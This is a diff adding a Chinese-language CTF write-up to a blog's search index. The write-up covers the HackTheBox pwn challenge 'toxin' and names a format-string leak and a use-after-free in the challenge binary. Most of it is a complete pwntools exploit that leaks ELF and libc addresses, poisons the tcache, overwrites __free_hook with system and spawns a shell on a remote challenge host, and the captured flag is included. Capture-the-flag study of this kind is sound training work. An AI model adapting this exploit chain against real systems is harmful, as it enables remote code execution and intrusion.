@@ -1044,4 +1044,50 @@ XTEA解密<figure class="highlight c"><table><tr><td class="code"><pre><span cla
         <tag>arm</tag>
       </tags>
   </entry>
+  <entry>
+    <title>toxin</title>
+    <url>/2021/10/07/toxin/</url>
+    <content><![CDATA[<h1 id="hackthebox-toxin"><a href="#hackthebox-toxin" class="headerlink" title="hackthebox-[toxin]"></a>hackthebox-[toxin]</h1><p>题目下载：<a href="https://drive.google.com/file/d/18Fz5PbtgujoYjpIHTDKKLzaoB9GKTmup/view?usp=sharing">点击下载</a></p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目提供libc，分析可得是运行在Ubuntu18.04，ida打开分析toxin分析。</p>
+<p>共有四个功能：</p>
+<ul>
+<li><p>add_toxin:<img src="https://i.loli.net/2021/10/07/fMuU4dVn6gKYD7Q.png" alt="image-20211007223801110"></p>
+</li>
+<li><p>edit_toxin</p>
+<p><img src="https://i.loli.net/2021/10/07/MFZUVEuC4NgHAza.png" alt="image-20211007223911579"></p>
+</li>
+<li><p>drink_toxin</p>
+<p><img src="https://i.loli.net/2021/10/07/jA5noGbKW26Jm4t.png" alt="image-20211007224214709"></p>
+</li>
+<li><p>search_toxin</p>
+<p><img src="https://i.loli.net/2021/10/07/1I2MYCWZaeO5EyP.png" alt="image-20211007224226546"></p>
+</li>
+</ul>
+<p>存在两个漏洞。格式化字符串和UAF漏洞：</p>
+<p>漏洞点：</p>
+<ul>
+<li><p>search_toxin函数存在格式化字符串漏洞，输入的长度有限制，只允许输入5个字符。</p>
+<p><img src="https://i.loli.net/2021/10/07/nuOodmIQGBxCHy7.png" alt="image-20211007223634019"></p>
+</li>
+<li><p>drink_toxin函数free掉后没有置0，存在UAF漏洞，但是存在限制，只允许free一次</p>
+<p><img src="https://i.loli.net/2021/10/07/NP2EYRZheGxDIj6.png" alt="image-20211007223653774"></p>
+</li>
+</ul>
+<p>查看保护机制：</p>
+<p><img src="https://i.loli.net/2021/10/07/xO9p5XV2oa3uzsL.png" alt="image-20211007224445569"></p>
+<p>可以发现出来<code>canary</code>保护没开，其他都开了，利用思路可以利用格式化字符串泄露libc地址和程序基值地址</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">search(<span class="string">&quot;%9$p&quot;</span>)</span><br><span class="line">elf_addr = <span class="built_in">int</span>(p.recvline()[:<span class="number">14</span>],<span class="number">16</span>)-<span class="number">207</span>-<span class="number">0x11B5</span></span><br><span class="line">log.info(<span class="string">&quot;elf  base: &quot;</span>+<span class="built_in">hex</span>(elf_addr))</span><br><span class="line">e.address=elf_addr</span><br><span class="line"></span><br><span class="line">search(<span class="string">&quot;%13$p&quot;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(p.recvline()[:<span class="number">14</span>],<span class="number">16</span>)-<span class="number">231</span>-libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc base: &quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">libc.address = libc_addr</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>泄露之后我们的free只能使用一次，所以我们要想办法控制这个标志，能够让我们不被这个标志限制，所以可以将存储<code>toxinfreed</code>和<code>toxin</code>变量add出来，然后使用edit修改，绕过限制，同时可以修改<code>free_hook</code>为<code>system</code>,free掉<code>/bin/sh</code>即可。</p>
+<p>exp.py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">file_name = <span class="string">&#x27;toxin&#x27;</span></span><br><span class="line">Remote = <span class="literal">True</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./lib/libc.so.6&#x27;</span>)</span><br><span class="line">e = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> Remote:</span><br><span class="line">    p= remote(<span class="string">&#x27;139.59.183.98&#x27;</span>,<span class="number">32226</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./lib/libc.so.6&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span>(<span class="params">content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter search term: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">length, idx ,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Toxin chemical formula length: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Toxin index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter toxin formula: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Toxin index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter toxin formula: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">drink</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Toxin index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">search(<span class="string">&quot;%9$p&quot;</span>)</span><br><span class="line">elf_addr = <span class="built_in">int</span>(p.recvline()[:<span class="number">14</span>],<span class="number">16</span>)-<span class="number">207</span>-<span class="number">0x11B5</span></span><br><span class="line">log.info(<span class="string">&quot;elf  base: &quot;</span>+<span class="built_in">hex</span>(elf_addr))</span><br><span class="line">e.address=elf_addr</span><br><span class="line"></span><br><span class="line">search(<span class="string">&quot;%13$p&quot;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(p.recvline()[:<span class="number">14</span>],<span class="number">16</span>)-<span class="number">231</span>-libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc base: &quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">libc.address = libc_addr</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>, <span class="number">0</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0xf</span>)</span><br><span class="line">drink(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(elf_addr+<span class="number">0x04050</span>))</span><br><span class="line">add(<span class="number">0x30</span>, <span class="number">1</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="number">2</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment"># 2 包括整个toxinfreed-toxins</span></span><br><span class="line">edit(<span class="number">2</span>, p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>])+p64(<span class="number">0</span>))</span><br><span class="line">edit(<span class="number">0</span>, p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x10</span>, <span class="number">1</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">drink(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># HTB&#123;tc4ch3_t0x1n4t10n???_0r_tc4ch3_p01So1n1NG??+F0rm4t...4m@ZiNg!!!&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20211007225703456.png" alt="image-20211007225703456"></p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>PWN</tag>
+        <tag>hackthebox</tag>
+        <tag>UAF</tag>
+        <tag>format_string</tag>
+      </tags>
+  </entry>
 </search>
